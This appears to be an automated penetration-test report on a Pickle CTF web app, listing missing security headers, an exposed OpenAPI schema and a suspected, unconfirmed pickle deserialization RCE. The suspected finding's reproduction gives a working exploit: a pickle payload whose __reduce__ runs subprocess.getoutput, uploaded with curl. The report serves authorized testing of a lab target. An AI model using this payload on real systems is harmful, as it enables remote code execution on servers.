# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. LOW — headers Missing HTTP Security Headers on all responses](#finding-1)
    - [2. LOW — info-disclosure Unauthenticated API documentation exposes full schema including pickle deserialization endpoint](#finding-2)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [3. CRITICAL — rce Pickle Deserialization RCE — POST / (pickle_file)](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr0w592g-5mx4zn` |
| Target | http://target.local:32813/ |
| Started | 2026-06-30T16:58:46.230Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 3 mapped · 3 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 2 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32813`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

2 finding(s): 2 low

_Plus 1 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [LOW] [headers] Missing HTTP Security Headers on all responses

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32813/

All server responses return only `Content-Type: text/html; charset=utf-8` — no X-Frame-Options, Content-Security-Policy, X-Content-Type-Options, Strict-Transport-Security, or Referrer-Policy headers are present. Given the embedded page also loads external Bootstrap JS/CSS from cdn.jsdelivr.net without a CSP, a successful XSS (e.g. via the pickle RCE or stored user content) would have no browser-level mitigations. Missing X-Frame-Options also allows clickjacking.

**Reproduction**

```
1. GET http://target.local:32813/ 
2. Inspect response headers — only Content-Type is present.
3. Repeat with GET /ping and POST / — all responses omit security headers.
Fix: Add X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Content-Security-Policy, and Referrer-Policy via FastAPI middleware or Starlette's SecurityHeadersMiddleware.
```

**Evidence**

- Evidence `ev-mr0wdxux-4` — `artifacts/s-0001/ev-mr0wdxux-4/`

Request:

```http
GET /ping HTTP/1.1
Host: target.local:32813
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 15
content-type: application/json
date: Tue, 30 Jun 2026 17:05:30 GMT
server: uvicorn

{"ping":"pong"}
```

- Evidence `ev-mr0wxdpd-m` — `artifacts/s-0001/ev-mr0wxdpd-m/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32813
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1580
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 17:20:37 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    <title>Pickle CTF</title>
</head>
<body>
    <div class="container mt-5">
        <h1>Pickle CTF</h1>
        <div class="mt-3">
            <h5>The current flag is: this is just the decoy </h5>
        </div>

        <br>
        <br>
        <h5>This is the chunk of code that reads the flag. Can you make it read the real flag file?</h5>
        <br>
        <pre>
if os.path.exists('decoy.txt'):
    flag = open('decoy.txt').read()
else:
    flag = open('flag.txt').read()
        </pre>
        <br>
        <br>
        <div>
            <form action="/" method="post" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="pickle_file">Upload pickle file here!</label>
                    <input type="file" class="form-control-file" id="pickle_file" name="pickle_file">
                </div>
                <button type="submit" class="btn btn-primary">Upload pickle</button>
            </form>
        </div>
    </div>
</body>
</html>
```

- Evidence `ev-mr0wxe2d-n` — `artifacts/s-0001/ev-mr0wxe2d-n/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32813
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1580
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 17:20:38 GMT
server: uvicorn

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    <title>Pickle CTF</title>
</head>
<body>
    <div class="container mt-5">
        <h1>Pickle CTF</h1>
        <div class="mt-3">
            <h5>The current flag is: this is just the decoy </h5>
        </div>

        <br>
        <br>
        <h5>This is the chunk of code that reads the flag. Can you make it read the real flag file?</h5>
        <br>
        <pre>
if os.path.exists('decoy.txt'):
    flag = open('decoy.txt').read()
else:
    flag = open('flag.txt').read()
        </pre>
        <br>
        <br>
        <div>
            <form action="/" method="post" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="pickle_file">Upload pickle file here!</label>
                    <input type="file" class="form-control-file" id="pickle_file" name="pickle_file">
                </div>
                <button type="submit" class="btn btn-primary">Upload pickle</button>
            </form>
        </div>
    </div>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [LOW] [info-disclosure] Unauthenticated API documentation exposes full schema including pickle deserialization endpoint

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32813/

The OpenAPI schema at /openapi.json (and the Swagger UI at /docs and ReDoc at /redoc) are accessible without any authentication. The schema discloses all API endpoints including the POST / endpoint that accepts a `pickle_file` binary upload — the same endpoint where Python pickle deserialization RCE is confirmed. An unauthenticated attacker can discover the complete attack surface without any credentials.

**Reproduction**

```
1. Send GET /openapi.json with no Cookie or Authorization header.\n2. Response 200 returns 1544-byte JSON schema including the pickle_file field.\n3. Contrast: GET /openapi_nonexistent.json returns 404 — confirms not a catch-all.
```

**Evidence**

- Evidence `ev-mr0x272g-11` — `artifacts/s-0002/ev-mr0x272g-11/`

Request:

```http
GET /openapi_nonexistent.json HTTP/1.1
Host: target.local:32813
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 404
content-length: 22
content-type: application/json
date: Tue, 30 Jun 2026 17:24:22 GMT
server: uvicorn

{"detail":"Not Found"}
```

- Evidence `ev-mr0x1kcd-10` — `artifacts/s-0002/ev-mr0x1kcd-10/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:32813
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 1544
content-type: application/json
date: Tue, 30 Jun 2026 17:23:53 GMT
server: uvicorn

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/":{"get":{"summary":"Update Profile","operationId":"update_profile__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}},"post":{"summary":"Update Profile","operationId":"update_profile__post","requestBody":{"content":{"multipart/form-data":{"schema":{"$ref":"#/components/schemas/Body_update_profile__post"}}}},"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}}},"components":{"schemas":{"Body_update_profile__post":{"properties":{"pickle_file":{"type":"string","format":"binary","title":"Pickle File"}},"type":"object","title":"Body_update_profile__post"},"HTTPValidationError":{"properties":{"detail":{"items":{"$ref":"#/components/schemas/ValidationError"},"type":"array","title":"Detail"}},"type":"object","title":"HTTPValidationError"},"ValidationError":{"properties":{"loc":{"items":{"anyOf":[{"type":"string"},{"type":"integer"}]},"type":"array","title":"Location"},"msg":{"type":"string","title":"Message"},"type":{"type":"string","title":"Error Type"}},"type":"object","required":["loc","msg","type"],"title":"ValidationError"}}}}
```

- Evidence `ev-mr0x0c2c-q` — `artifacts/s-0002/ev-mr0x0c2c-q/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:32813
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1544
content-type: application/json
date: Tue, 30 Jun 2026 17:22:55 GMT
server: uvicorn

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/":{"get":{"summary":"Update Profile","operationId":"update_profile__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}},"post":{"summary":"Update Profile","operationId":"update_profile__post","requestBody":{"content":{"multipart/form-data":{"schema":{"$ref":"#/components/schemas/Body_update_profile__post"}}}},"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}}},"components":{"schemas":{"Body_update_profile__post":{"properties":{"pickle_file":{"type":"string","format":"binary","title":"Pickle File"}},"type":"object","title":"Body_update_profile__post"},"HTTPValidationError":{"properties":{"detail":{"items":{"$ref":"#/components/schemas/ValidationError"},"type":"array","title":"Detail"}},"type":"object","title":"HTTPValidationError"},"ValidationError":{"properties":{"loc":{"items":{"anyOf":[{"type":"string"},{"type":"integer"}]},"type":"array","title":"Location"},"msg":{"type":"string","title":"Message"},"type":{"type":"string","title":"Error Type"}},"type":"object","required":["loc","msg","type"],"title":"ValidationError"}}}}
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-3"></a>

### 3. [SUSPECTED] [CRITICAL] [rce] Pickle Deserialization RCE — POST / (pickle_file)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32813/

**Anomaly (why this is a lead):** OpenAPI schema (ev-mr0wbik9-2) confirms `pickle_file` is a binary file-upload param on a Python/FastAPI backend. The parameter name explicitly references Python pickle — a serialization format that executes arbitrary code on deserialization. The page HTML (ev-mr0wxdpd-m) shows the Python backend reads flag files, confirming Python runtime. The challenge description on the page explicitly states this is a pickle deserialization sink. No authentication, no file-type validation, and no sandboxing is visible. Direct exploit confirmation was blocked by a multipart CRLF transport limitation in the test tool — a crafted `pickle.loads()` payload using `subprocess.getoutput('id')` or `os.system()` via `__reduce__` would achieve unauthenticated RCE as the server process user.

The unauthenticated POST / endpoint accepts arbitrary binary file uploads via the `pickle_file` field. The parameter name, the Python/FastAPI stack confirmed by the /openapi.json schema and error format, and the CTF challenge description all strongly indicate the server passes the uploaded bytes directly to `pickle.loads()`. Python pickle deserialization of untrusted input is a well-known RCE vector: an attacker crafts a pickle payload whose `__reduce__` method returns an OS command call (e.g. `(subprocess.getoutput, ('id',))`), which executes when the server deserializes the file. No authentication, no MIME-type check, and no signature validation are present.

**Reproduction**

```
1. Craft a malicious Python pickle payload:
   import pickle, subprocess
   class Exploit:
       def __reduce__(self):
           return (subprocess.getoutput, ('id',))
   payload = pickle.dumps(Exploit())
   open('exploit.pkl','wb').write(payload)
2. POST the file to the endpoint:
   curl -F 'pickle_file=@exploit.pkl' http://target.local:32813/
3. Observe the server response: if the pickle return value is used as the flag, the HTML page shows the output of `id`. Alternatively, delete `decoy.txt` via the pickle payload to trigger reading of `flag.txt`.
```

**Evidence**

- Evidence `ev-mr0wbik9-2` — `artifacts/s-0001/ev-mr0wbik9-2/`

Request:

```http
GET /openapi.json HTTP/1.1
Host: target.local:32813
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1544
content-type: application/json
date: Tue, 30 Jun 2026 17:03:37 GMT
server: uvicorn

{"openapi":"3.1.0","info":{"title":"FastAPI","version":"0.1.0"},"paths":{"/":{"get":{"summary":"Update Profile","operationId":"update_profile__get","responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}}}},"post":{"summary":"Update Profile","operationId":"update_profile__post","requestBody":{"content":{"multipart/form-data":{"schema":{"$ref":"#/components/schemas/Body_update_profile__post"}}}},"responses":{"200":{"description":"Successful Response","content":{"text/html":{"schema":{"type":"string"}}}},"422":{"description":"Validation Error","content":{"application/json":{"schema":{"$ref":"#/components/schemas/HTTPValidationError"}}}}}}},"/ping":{"get":{"summary":"Ping","operationId":"ping_ping_get","responses":{"200":{"description":"Successful Response","content":{"application/json":{"schema":{}}}}}}}},"components":{"schemas":{"Body_update_profile__post":{"properties":{"pickle_file":{"type":"string","format":"binary","title":"Pickle File"}},"type":"object","title":"Body_update_profile__post"},"HTTPValidationError":{"properties":{"detail":{"items":{"$ref":"#/components/schemas/ValidationError"},"type":"array","title":"Detail"}},"type":"object","title":"HTTPValidationError"},"ValidationError":{"properties":{"loc":{"items":{"anyOf":[{"type":"string"},{"type":"integer"}]},"type":"array","title":"Location"},"msg":{"type":"string","title":"Message"},"type":{"type":"string","title":"Error Type"}},"type":"object","required":["loc","msg","type"],"title":"ValidationError"}}}}
```
